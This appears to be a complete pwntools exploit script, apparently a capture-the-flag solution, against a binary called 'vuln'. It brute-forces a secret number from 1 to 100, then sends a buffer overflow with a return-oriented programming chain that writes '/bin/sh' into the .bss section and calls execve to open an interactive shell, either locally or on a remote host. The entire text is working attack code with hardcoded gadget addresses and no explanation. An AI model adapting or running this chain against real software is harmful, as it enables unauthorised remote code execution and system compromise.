#!/usr/bin/env python3

from pwn import *

elf = ELF('vuln', checksec=False)
context.binary = elf

def get_process():
    if len(sys.argv) == 1:
        return process(elf.path)

    host, port = sys.argv[1], sys.argv[2]
    return remote(host, port)


number = 0
number_progress = log.progress('Guessing number')

for i in range(1, 101):
    number_progress.status(str(i))

    with context.local(log_level='CRITICAL'):
        p = get_process()
        p.sendlineafter(b'What number would you like to guess?\n', str(i).encode())

        if b'Congrats!' in p.recvline():
            number = i
            break

        p.close()

if number == 0:
    log.critical('Failed to guess number')

log.success(f'Guessed number: {number}')

bss = 0x6bc3a0

pop_rdi_ret = 0x400696
pop_rsi_ret = 0x410ca3
pop_rdx_ret = 0x44a6b5
pop_rax_ret = 0x4163f4

mov_qword_ptr_rdx_rax_ret = 0x419127

syscall = 0x40137c

offset = 120
junk = b'A' * offset

payload  = junk
payload += p64(pop_rdx_ret)
payload += p64(bss)
payload += p64(pop_rax_ret)
payload += b'/bin/sh\0'
payload += p64(mov_qword_ptr_rdx_rax_ret)
payload += p64(pop_rax_ret)
payload += p64(0x3b)
payload += p64(pop_rdi_ret)
payload += p64(bss)
payload += p64(pop_rsi_ret)
payload += p64(0)
payload += p64(pop_rdx_ret)
payload += p64(0)
payload += p64(syscall)

p.sendlineafter(b'Name?', payload)
p.recvline()
p.recvline()

p.interactive()
